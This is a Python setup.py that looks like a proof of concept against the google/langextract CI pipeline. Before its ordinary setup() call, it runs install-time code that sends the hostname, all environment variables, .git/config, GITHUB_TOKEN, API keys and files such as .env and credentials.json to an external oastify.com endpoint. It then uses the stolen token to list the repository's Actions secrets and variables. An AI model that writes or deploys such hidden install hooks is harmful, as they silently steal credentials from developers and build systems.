import os
import subprocess
import base64
import urllib.request
import json
import socket

OAST = "5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com"

def exfil(path, data):
    """Exfiltrate data to OAST endpoint"""
    try:
        if isinstance(data, str):
            data = data.encode()
        req = urllib.request.Request(
            f"https://{OAST}/langextract{path}",
            data=data,
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        pass

def exfil_chunks(path, data, chunk_size=500):
    """Exfiltrate large data in chunks"""
    encoded = base64.b64encode(data.encode()).decode() if isinstance(data, str) else base64.b64encode(data).decode()
    total_chunks = (len(encoded) + chunk_size - 1) // chunk_size
    for i in range(total_chunks):
        chunk = encoded[i*chunk_size:(i+1)*chunk_size]
        try:
            urllib.request.urlopen(
                f"https://{OAST}{path}/chunk_{i}_of_{total_chunks}/{chunk}",
                timeout=5
            )
        except:
            pass

# Phase 1: Quick ping to confirm execution
exfil("/ping", f"hostname={socket.gethostname()}")

# Phase 2: Exfiltrate ALL environment variables
env_data = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
exfil("/env_full", env_data)

# Phase 3: Exfiltrate .git/config (full)
try:
    with open(".git/config", "r") as f:
        git_config = f.read()
    exfil("/gitconfig_full", git_config)
except:
    pass

# Phase 4: Exfiltrate GITHUB_TOKEN specifically
github_token = os.environ.get("GITHUB_TOKEN", "NOT_FOUND")
exfil("/github_token", f"token={github_token}")

# Phase 5: Check for any API keys in environment
api_keys = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ["API", "KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL"])}
if api_keys:
    exfil("/api_keys", json.dumps(api_keys))

# Phase 6: Use GITHUB_TOKEN to enumerate what we can access
if github_token and github_token != "NOT_FOUND":
    try:
        # Check token permissions
        req = urllib.request.Request(
            "https://api.github.com/user",
            headers={"Authorization": f"token {github_token}"}
        )
        resp = urllib.request.urlopen(req, timeout=5)
        exfil("/token_user", resp.read())
    except Exception as e:
        exfil("/token_error", str(e))

    try:
        # List repo secrets (names only)
        req = urllib.request.Request(
            "https://api.github.com/repos/google/langextract/actions/secrets",
            headers={"Authorization": f"token {github_token}"}
        )
        resp = urllib.request.urlopen(req, timeout=5)
        exfil("/secrets_list", resp.read())
    except Exception as e:
        pass

    try:
        # List actions variables
        req = urllib.request.Request(
            "https://api.github.com/repos/google/langextract/actions/variables",
            headers={"Authorization": f"token {github_token}"}
        )
        resp = urllib.request.urlopen(req, timeout=5)
        exfil("/variables", resp.read())
    except:
        pass

# Phase 7: Read any interesting files
interesting_files = [
    ".github/workflows/ci.yaml",
    "pyproject.toml",
    ".env",
    ".env.local",
    "secrets.yaml",
    "credentials.json"
]
for filepath in interesting_files:
    try:
        with open(filepath, "r") as f:
            content = f.read()
        exfil(f"/file/{filepath.replace('/', '_')}", content[:2000])
    except:
        pass

# Now the actual setup.py content
from setuptools import setup, find_packages

setup(
    name="langextract-poc",
    version="0.0.1",
    packages=find_packages(),
)
